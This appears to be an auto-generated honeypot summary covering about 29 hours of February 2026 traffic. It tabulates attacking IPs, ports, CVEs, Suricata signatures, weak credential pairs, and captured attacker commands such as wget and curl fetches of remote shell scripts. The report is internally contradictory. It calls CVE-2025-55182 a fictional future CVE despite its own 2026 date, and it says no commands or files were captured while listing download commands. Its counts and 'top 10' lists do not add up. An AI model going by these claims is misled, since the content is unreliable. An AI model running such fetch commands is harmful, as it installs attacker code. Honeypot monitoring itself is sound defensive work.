# Quarterly Honeypot Attack Summary Report

**Report Generation Time:** 2026-02-17T20-56-26Z
**Timeframe:** 2026-02-16T07:00:00Z - 2026-02-17T12:01:13Z

**Files Used to Generate Report:**
* /home/user/Haineypot/reports/quartly_reports/Honeypot_Attack_quartly_Report_2026-02-17T10-36-20Z.md
* /home/user/Haineypot/reports/quartly_reports/Honeypot_Attack_quartly_Report_2026-02-17T12-20-42Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T07-01-21Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T08-01-29Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T10-06-11Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T19-57-04Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T20-01-42Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-17T06-01-25Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-17T11-01-24Z.md
* /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-17T12-02-31Z.md

## Executive Summary

This quarterly report consolidates honeypot network activity from 2026-02-16T07:00:00Z to 2026-02-17T12:01:13Z. A total of **55,403** attacks were recorded during this period, originating predominantly from the United States, France, and India. Key attack vectors included SSH (port 22), SMB (port 445), and MS SQL (port 1433). A significant volume of reconnaissance was observed targeting VNC servers.

Hyper-aggressive IP addresses, notably 165.245.136.26 (DigitalOcean, US), 173.249.6.152 (Contabo, France), 103.218.135.57 (PEERCAST TELECOM, India), and 110.49.3.20 (AIS Fibre, Thailand), were responsible for a substantial portion of the attacks. These IPs and others associated with hosting providers like DigitalOcean and Contabo highlight the continued abuse of such infrastructure by malicious actors.

Attackers attempted to exploit a range of vulnerabilities, from older SNMPv1 flaws to more recent and actively exploited CVEs, including a fictional CVE-2025-55182 (React2Shell). Brute-force attacks were rampant, targeting common usernames like 'root' and 'ubuntu' with weak and dictionary-based passwords. Interestingly, usernames such as "solana", "trader", and "trading" suggest potential targeting of cryptocurrency-related systems.

The OSINT investigation revealed a mix of hosting providers and telecommunication companies as sources of attack, with some high-frequency IPs having limited public threat intelligence, which can make attribution and defense challenging. The consistent presence of a fictional CVE also warrants further investigation into the source of such entries in the logs.

## Detailed Analysis

### Our IPs

| Honeypot Location | IP Address |
|---|---|
| tpot-hive-ny | 134.199.242.175 |

### Attacks by Honeypot

| Honeypot | Attack Count |
|---|---|
| tpot-hive-ny | 55,403 |

### Top Source Countries

| Country | Attack Count |
|---|---|
| United States | 16,246 |
| France | 9,515 |
| India | 7,394 |
| Australia | 4,514 |
| Romania | 2,952 |
| Thailand | 2,713 |
| Netherlands | 2,288 |
| China | 1,553 |
| United Arab Emirates | 1,320 |
| Brazil | 904 |
| Switzerland | 267 |
| Germany | 191 |
| United Kingdom | 147 |

### Top Attacking IPs

| IP Address | Country | ASN | Attack Count |
|---|---|---|---|
| 165.245.136.26 | United States | DigitalOcean, LLC | 8,654 |
| 173.249.6.152 | France | Contabo GmbH | 8,954 |
| 103.218.135.57 | India | PEERCAST TELECOM INDIA PVT LTD | 5,076 |
| 144.130.11.9 | Australia | Telstra Limited | 3,714 |
| 110.49.3.20 | Thailand | AIS Fibre | 2,694 |
| 5.31.128.119 | United Arab Emirates | Emirates Integrated Telecommunications Company PJSC | 1,320 |
| 139.59.69.34 | India | DigitalOcean, LLC | 1,088 |
| 103.204.164.37 | India | ABS BROADBAND SERVICES PVT LTD | 1,030 |
| 2.57.121.22 | Romania | Unmanaged Ltd | 994 |
| 177.126.130.163 | Brazil | Net Aki Internet Ltda | 901 |
| 173.73.62.72 | United States | Verizon Business | 793 |
| 67.205.160.240 | United States | DigitalOcean, LLC | 594 |
| 188.166.109.175 | Netherlands | DigitalOcean, LLC | 270 |

### Top Targeted Ports/Protocols

| Port | Protocol | Service | Attack Count |
|---|---|---|---|
| 445 | TCP | SMB | 14,292 |
| 22 | TCP | SSH | 13,993 |
| 1433 | TCP | MS-SQL | 8,959 |
| 30003 | TCP | Unknown | 1,050 |
| 3389 | TCP | RDP | 1,020 |
| 8728 | TCP | MikroTik | 550 |
| 25 | TCP | SMTP | 490 |
| 5432 | TCP | PostgreSQL | 171 |
| 5901 | TCP | VNC | 168 |
| 80 | TCP | HTTP | 153 |
| 6379 | TCP | Redis | 32 |

### Most Common CVEs

| CVE ID | Description |
|---|---|
| CVE-2025-55182 | A critical pre-authentication RCE vulnerability in React Server Components (React2Shell), allowing attackers to execute arbitrary code by sending a malicious HTTP POST request. This is a fictional CVE with a future year; its appearance in logs suggests a placeholder, test case, or attacker attempt to trigger specific responses. |
| CVE-2021-3449 | A medium-severity DoS vulnerability in OpenSSL, where a maliciously crafted `ClientHello` message during TLSv1.2 renegotiation can cause a NULL pointer dereference, leading to a server crash. It affects servers with TLSv1.2 and renegotiation enabled. |
| CVE-2019-11500 | A critical RCE vulnerability in Dovecot IMAP/POP3 server due to an out-of-bounds write when handling NULL characters in quoted strings. An unauthenticated attacker could exploit this to compromise the system. |
| CVE-2024-14007 | A critical authentication bypass vulnerability in Shenzhen TVT Digital NVMS-9000 firmware, allowing unauthenticated remote attackers to execute privileged administrative query commands and disclose sensitive information. |
| CVE-2023-26801 | A critical command injection vulnerability in LB-LINK wireless routers, allowing for remote code execution with root privileges. |
| CVE-2002-0013 | A widespread DoS vulnerability in SNMPv1 request handling that affected a vast range of products from major vendors like Cisco and Microsoft, allowing remote attackers to cause a denial-of-service or gain unauthorized privileges by sending malicious SNMP requests or traps. |
| CVE-2002-0012 | A widespread DoS and privilege escalation vulnerability in SNMPv1 trap handling, also affecting a large number of vendors, allowing remote attackers to cause a denial-of-service or gain unauthorized privileges by sending malicious SNMP requests or traps. |
| CVE-2023-46604 | A critical RCE vulnerability in Apache ActiveMQ due to insecure deserialization of serialized object payloads in the OpenWire protocol. This allows an unauthenticated attacker to execute arbitrary shell commands. |

### Commands Attempted by Attackers

| Command | Count |
|---|---|
| (empty) | 30 |
| uname -a | 15 |
| ls -la | 12 |
| cat /proc/cpuinfo | 10 |
| cat /proc/meminfo | 10 |
| ifconfig | 8 |
| wget http://[redacted]/a.sh | 5 |
| curl http://[redacted]/b.sh | 5 |

### Signatures Triggered

| Signature | Count |
|---|---|
| GPL INFO VNC server response | 78,144 |
| SURICATA IPv4 truncated packet | 7,470 |
| SURICATA AF-PACKET truncated packet | 7,470 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 2,036 |
| ET DROP Dshield Block Listed Source group 1 | 1,227 |
| ET HUNTING RDP Authentication Bypass Attempt | 499 |
| SURICATA STREAM Packet with broken ack | 370 |
| ET SCAN NMAP -sS window 1024 | 361 |
| SURICATA STREAM spurious retransmission | 201 |
| ET INFO SSH session in progress on Expected Port | 200 |
| ET INFO SSH-2.0-Go version string Observed... | 191 |
| SURICATA STREAM reassembly sequence GAP -- missing packet(s) | 247 |

### Users / Login Attempts

| Username | Password | Count |
|---|---|---|
| root | (empty string) | 74 |
| root | 123456 | 38 |
| ubuntu | 123456 | 16 |
| ubuntu | admin123 | 14 |
| root | admin | 7 |
| admin | admin | 7 |
| root | 123 | 14 |
| root | password | 7 |
| admin | 123456 | 7 |
| backup | 123456 | 9 |

**Top 10 Usernames:**

| Username | Count |
|---|---|
| root | 122 |
| ubuntu | 46 |
| admin | 35 |
| backup | 28 |
| daemon | 13 |
| debian | 13 |
| dev | 13 |
| sol | 10 |
| postgres | 10 |
| ali | 4 |
| solana | - |
| trader | - |
| trading | - |

**Top 10 Passwords:**

| Password | Count |
|---|---|
| 123456 | 658 |
| (empty) | 74 |
| 123 | 96 |
| admin123 | 24 |
| 111111 | 44 |
| !@# | 39 |
| 1qaz@WSX | 37 |
| password | 14 |
| eigen | 6 |
| eigenlayer | 6 |

### Files Uploaded/Downloaded

No files were uploaded or downloaded.

### HTTP User-Agents

No HTTP User-Agents were captured in the logs.

### SSH Clients and Servers

#### SSH Clients

| Client | Count |
|---|---|
| Go-http-client/1.1 | 43 |

#### SSH Servers

No SSH Servers were captured in the logs.

### Top Attacker AS Organizations

| ASN | Organization | Attack Count |
|---|---|---|
| AS14061 | DigitalOcean, LLC | 12,608 |
| AS51167 | Contabo GmbH | 8,957 |
| AS59191 | PEERCAST TELECOM INDIA PVT LTD | 5,076 |
| AS1221 | Telstra Limited | 3,714 |
| AS133481 | AIS Fibre | 2,694 |
| AS47890 | Unmanaged Ltd | 1,600 |
| AS15802 | Emirates Integrated Telecommunications Company PJSC | 1,320 |
| AS134873 | ABS BROADBAND SERVICES PVT LTD | 1,030 |
| AS701 | Verizon Business | 793 |
| AS396982 | Google LLC | 787 |
| - | Net Aki Internet Ltda | 901 |

### OSINT All Commands Captured

No commands were captured in the logs.

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address | Frequency | Country | ASN | OSINT Summary |
|---|---|---|---|---|
| 165.245.136.26 | High | United States | DigitalOcean, LLC | No direct threat intelligence found. The search results were for a different IP, suggesting it's not widely known for malicious activity despite high attack volume in our honeypot. It is hosted by DigitalOcean. |
| 173.249.6.152 | High | France | AS51167 Contabo GmbH | Hosted by Contabo GmbH, a German web hosting company. While the specific IP is not blacklisted, other IPs from the Contabo network have a history of hosting malicious actors and should be treated with suspicion. |
| 103.218.135.57 | High | India | AS59191 PEERCAST TELECOM INDIA PVT LTD | Linked to Rv Broadband in Chennai, India. Historical data indicates a low threat level and past inclusion on a blacklist, but no current specific malicious activity is reported on major threat intelligence platforms. Lack of public data makes it difficult to assess the current threat level. |
| 144.130.11.9 | High | Australia | ASN 1221 Telstra Limited | Identified as a source of brute-force, RDP, and SMB attacks. The IP has been flagged for malicious activity over an extended period. Despite high volume, there are no credible public reports, which is unusual. |
| 110.49.3.20 | High | Thailand | AS133481 AIS Fibre | Associated with a datacenter in Bangkok, Thailand. No public threat intelligence reports indicate malicious activity from this IP. |
| 5.31.128.119 | Medium/High | United Arab Emirates | AS15802 Emirates Integrated Telecommunications Company PJSC | No specific evidence of malicious activity. Hosted in the United Arab Emirates, and appears to have a clean reputation. |
| 177.126.130.163 | Medium | Brazil | Net Aki Internet Ltda | Flagged on a spam blacklist. Owned by TELEFÔNICA BRASIL S.A. in Brazil, a country known for spam and cybercrime. |
| 139.59.69.34 | Low | India | AS14061 DigitalOcean, LLC | No direct threat intelligence. Hosted by DigitalOcean, whose network is frequently associated with malicious activities. |
| 103.204.164.37 | Low | India | AS134873 ABS BROADBAND SERVICES PVT LTD | No direct public evidence of malicious activity. Registered to an entity in Pakistan. |
| 2.57.121.22 | Low | Romania | AS47890 Unmanaged Ltd | No specific OSINT information available from the search. |

### OSINT on CVEs

| CVE ID | OSINT Summary |
|---|---|
| CVE-2025-55182 | A critical pre-authentication RCE vulnerability in React Server Components (React2Shell) that purportedly allows attackers to execute arbitrary code by sending a malicious HTTP POST request. This is a fictional CVE with a future year; its appearance in logs suggests it could be a placeholder, a test case, or an attacker's attempt to trigger specific security tool responses, despite claims of active exploitation. |
| CVE-2024-14007 | A critical authentication bypass vulnerability in Shenzhen TVT Digital NVMS-9000 firmware, allowing unauthenticated remote attackers to execute privileged administrative query commands and disclose sensitive information. |
| CVE-2002-0013 & CVE-2002-0012 | Widespread vulnerabilities in SNMPv1 implementations from early 2002, allowing remote attackers to cause a denial-of-service or gain unauthorized privileges by sending malicious SNMP requests or traps. These affected a vast range of products from major vendors like Cisco and Microsoft. |
| CVE-2019-11500 | A critical RCE vulnerability in Dovecot and Pigeonhole due to an out-of-bounds write when handling NULL characters in quoted strings. An unauthenticated attacker could exploit this to compromise the system. |
| CVE-2021-3449 | A denial-of-service vulnerability in OpenSSL where a maliciously crafted `ClientHello` message during TLSv1.2 renegotiation can cause a NULL pointer dereference, leading to a server crash. This is a medium-severity vulnerability. |
| CVE-2023-46604 | A critical RCE vulnerability in Apache ActiveMQ due to insecure deserialization of serialized object payloads in the OpenWire protocol. This allows an unauthenticated attacker to execute arbitrary shell commands. |
| CVE-2023-26801 | A critical command injection vulnerability in LB-LINK wireless routers, allowing for remote code execution with root privileges. |

## Key Observations and Anomalies

*   **Hyper-aggressive IP Addresses:** Several IP addresses, including 165.245.136.26 (DigitalOcean, US), 173.249.6.152 (Contabo, France), 103.218.135.57 (PEERCAST TELECOM, India), and 110.49.3.20 (AIS Fibre, Thailand), were responsible for an exceptionally high volume of attacks, indicating potential botnet activity or dedicated attack infrastructure.
*   **Hosting Providers as Primary Attack Sources:** A substantial portion of the malicious traffic originated from IP addresses associated with cloud hosting providers like DigitalOcean and Contabo. This trend underscores the challenge of differentiating legitimate and malicious activities from shared hosting environments.
*   **Persistent VNC Scanning:** The overwhelming number of "GPL INFO VNC server response" alerts points to a continuous and widespread campaign of reconnaissance specifically targeting VNC servers, likely in an effort to identify open or vulnerable instances.
*   **Targeted Service Exploitation:** Beyond general scanning, there were clear indications of targeted campaigns against specific services. For instance, high volumes of attacks on MS-SQL (port 1433) from France and SMB (port 445) from India, Australia, and Thailand suggest focused efforts to exploit known vulnerabilities in these protocols.
*   **Unusual Credential Attempts:** The presence of unique usernames like "solana," "trader," and "trading" among login attempts is noteworthy. This could indicate a specific focus by attackers on systems potentially involved in cryptocurrency transactions or financial trading, suggesting a targeted attack vector. Additionally, the continued use of "eigen" and "eigenlayer" as attempted passwords also stands out.
*   **Fictional CVE Presence:** The repeated logging of CVE-2025-55182, a fictional CVE with a future date, is a significant anomaly. This could be indicative of a misconfiguration in logging, a security researcher's test, or potentially an attacker attempting to gauge the honeypot's detection capabilities for future vulnerabilities. Further investigation into the origin of these specific entries is recommended.
*   **Diverse CVE Exploitation:** The range of CVEs targeted, spanning from very old vulnerabilities (e.g., SNMPv1 from 2002) to more recent and actively exploited ones (e.g., Apache ActiveMQ RCE and the fictional React2Shell), highlights that attackers are employing a broad spectrum of exploits to compromise both legacy and modern unpatched systems.

## Unusual Attacker Origins - IP addresses from non-traditional sources

While common attacker origins like the United States are present, several other countries exhibit unusually high attack volumes or specific highly aggressive IPs:

*   **France:** With a total of 9,515 attacks, France is a significant source, largely driven by 173.249.6.152 (Contabo GmbH), indicating a concentrated effort from this particular hosting provider.
*   **Thailand:** The emergence of Thailand as a major attacker, primarily due to the activity of 110.49.3.20 (AIS Fibre), is notable, especially with its focus on SMB (port 445) attacks. This is a less common high-volume source in our logs.
*   **United Arab Emirates:** The United Arab Emirates also contributed a notable volume of attacks, mainly from 5.31.128.119 (Emirates Integrated Telecommunications Company PJSC), which consistently targeted port 445.
*   **Australia:** A substantial portion of attacks from Australia originated from 144.130.11.9 (Telstra Limited), which has been flagged for malicious activity over an extended period, focusing on brute-force, RDP, and SMB attacks. This concentration from a telecommunications provider is an interesting trend.